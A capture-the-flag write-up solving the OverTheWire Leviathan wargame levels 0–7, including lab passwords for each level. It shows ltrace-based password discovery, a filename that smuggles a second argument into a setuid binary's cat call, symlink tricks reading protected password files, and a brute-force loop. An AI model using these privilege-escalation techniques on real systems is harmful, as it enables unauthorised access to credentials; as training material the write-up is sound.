---
layout: post
title: OverTheWire - Leviathan 0-7
---
Dare you face the lord of the oceans?

Leviathan is a wargame that has been rescued from the demise of intruded.net, previously hosted on leviathan.intruded.net.

## Level 0

`leviathan0:leviathan0`

Check the hidden .backup folder, and look through the long bookmarks file.

```bash
leviathan0@leviathan:~/.backup$ grep leviathan bookmarks.html
<DT><A HREF="http://leviathan.labs.overthewire.org/passwordus.html | This will be fixed later, the password for leviathan1 is rioGegei8m" ADD_DATE="1155384634" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">password to leviathan1</A>
```

## Level 1

`leviathan1:rioGegei8m`

We are presented with an executable with its setuid flag set, which means elevated privileges. Using a cheeky `ltrace`, we find the password in a `strcmp`.


```bash
leviathan1@leviathan:~$ file check
check: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=c735f6f3a3a94adcad8407cc0fda40496fd765dd, not stripped
leviathan1@leviathan:~$ ltrace ./check
__libc_start_main(0x804853b, 1, 0xffffd784, 0x8048610 <unfinished ...>
printf("password: ")                                     = 10
getchar(1, 0, 0x65766f6c, 0x646f6700password: hi
)                    = 104
getchar(1, 0, 0x65766f6c, 0x646f6700)                    = 105
getchar(1, 0, 0x65766f6c, 0x646f6700)                    = 10
strcmp("hi\n", "sex")                                    = -1
puts("Wrong password, Good Bye ..."Wrong password, Good Bye ...
)                     = 29
+++ exited (status 0) +++
leviathan1@leviathan:~$ ./check
password: sex
$ whoami
leviathan2
$ cat /etc/leviathan_pass/leviathan2
ougahZi8Ta
```
Reference: https://rainbow.chard.org/2011/10/02/debug-like-a-sysadmin/

## Level 2

`leviathan2:ougahZi8Ta`

Using `ltrace`, we can see that our parameter is passed into `cat` using string interpolation in `snprintf()` after `access()` checks whether the calling process can access the file pathname.

```bash
leviathan2@leviathan:~$ ltrace ./printfile /etc/leviathan_pass/leviathan2
__libc_start_main(0x804852b, 2, 0xffffd764, 0x8048610 <unfinished ...>
access("/etc/leviathan_pass/leviathan2", 4)                   = 0
snprintf("/bin/cat /etc/leviathan_pass/lev"..., 511, "/bin/cat %s", "/etc/leviathan_pass/leviathan2") = 39
geteuid()                                                     = 12002
geteuid()                                                     = 12002
setreuid(12002, 12002)                                        = 0
system("/bin/cat /etc/leviathan_pass/lev"...ougahZi8Ta
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                        = 0
+++ exited (status 0) +++
```

So if we pass in the name of a file that can be read but includes our filename delimited with a space, we can bypass `access()` and open two files with `cat`. Because we cannot create file names that includes "/etc/leviathan_pass/leviathan3" due to the nature of the `/` character, we have to create a symbolic link to our password file to include.

```bash
leviathan2@leviathan:~$ mkdir /tmp/omicronjob && cd $_
leviathan2@leviathan:/tmp/omicronjob$ echo "dummy file" > dummy
leviathan2@leviathan:/tmp/omicronjob$ ln -s /etc/leviathan_pass/leviathan3 link
leviathan2@leviathan:/tmp/omicronjob$ echo "sneaky" > dummy\ link

```

It looks like our files were passed in. Success!

```bash
leviathan2@leviathan:/tmp/omicronjob$ ltrace ~/printfile "dummy link"
__libc_start_main(0x804852b, 2, 0xffffd744, 0x8048610 <unfinished ...>
access("dummy link", 4)                                       = 0
snprintf("/bin/cat dummy link", 511, "/bin/cat %s", "dummy link") = 19
geteuid()                                                     = 12002
geteuid()                                                     = 12002
setreuid(12002, 12002)                                        = 0
system("/bin/cat dummy link"dummy file
/bin/cat: link: Permission denied
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                        = 256
+++ exited (status 0) +++
leviathan2@leviathan:/tmp/omicronjob$ ~/printfile "dummy link"
dummy file
Ahdiemoo1j
```
## Level 3

`leviathan3:Ahdiemoo1j`

Here the password is compared with "snlprintf".

```bash
leviathan3@leviathan:~$ ltrace ./level3
__libc_start_main(0x8048618, 1, 0xffffd784, 0x80486d0 <unfinished ...>
strcmp("h0no33", "kakaka")                                    = -1
printf("Enter the password> ")                                = 20
fgets(Enter the password> letmein
"letmein\n", 256, 0xf7fc55a0)                           = 0xffffd590
strcmp("letmein\n", "snlprintf\n")                            = -1
puts("bzzzzzzzzap. WRONG"bzzzzzzzzap. WRONG
)                                    = 19
+++ exited (status 0) +++
```

When we supply that string as the password, we are given a shell with leviathan4 privileges.

```bash
leviathan3@leviathan:~$ ./level3
Enter the password> snlprintf
[You've got shell]!
$ whoami
leviathan4
$ cat /etc/leviathan_pass/leviathan4
vuH0coox6m
```

## Level 4

`leviathan4:vuH0coox6m`

It looks like our new binary just reads us the password which happens to be in binary.
```bash
leviathan4@leviathan:~$ cd .trash/
leviathan4@leviathan:~/.trash$ ls -al
total 16
dr-xr-x--- 2 root       leviathan4 4096 Aug 26  2019 .
drwxr-xr-x 3 root       root       4096 Aug 26  2019 ..
-r-sr-x--- 1 leviathan5 leviathan4 7352 Aug 26  2019 bin
leviathan4@leviathan:~/.trash$ ltrace ./bin
__libc_start_main(0x80484bb, 1, 0xffffd774, 0x80485b0 <unfinished ...>
fopen("/etc/leviathan_pass/leviathan5", "r")                  = 0
+++ exited (status 255) +++
leviathan4@leviathan:~/.trash$ ./bin
01010100 01101001 01110100 01101000 00110100 01100011 01101111 01101011 01100101 01101001 00001010
```
Converting the binary to ASCII gives us `Tith4cokei`.

## Level 5

`leviathan5:Tith4cokei`

This one is pretty simple. We just have to create a log file to be read from with elevated privileges.

```bash
leviathan5@leviathan:~$ ./leviathan5
Cannot find /tmp/file.log
leviathan5@leviathan:~$ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
leviathan5@leviathan:~$ ./leviathan5
UgaoFee4li
```

## Level 6

`leviathan6:UgaoFee4li`


```bash
leviathan6@leviathan:~$ ./leviathan6
usage: ./leviathan6 <4 digit code>
leviathan6@leviathan:~$ ./leviathan6 4444
Wrong
leviathan6@leviathan:~$ ltrace ./leviathan6 4444
__libc_start_main(0x804853b, 2, 0xffffd774, 0x80485e0 <unfinished ...>
atoi(0xffffd8ab, 0, 0xf7e40890, 0x804862b)                    = 4444
puts("Wrong"Wrong
)                                                 = 6
+++ exited (status 0) +++
```

Let's brute force it.

```bash
leviathan6@leviathan:~$ for i in {0000..9999}; do ./leviathan6 $i | grep -v Wrong; done
...
whoami
leviathan7
cat /etc/leviathan_pass/leviathan7
ahy7MaeBo9
```

## Level 7

`leviathan7:ahy7MaeBo9`

The end!
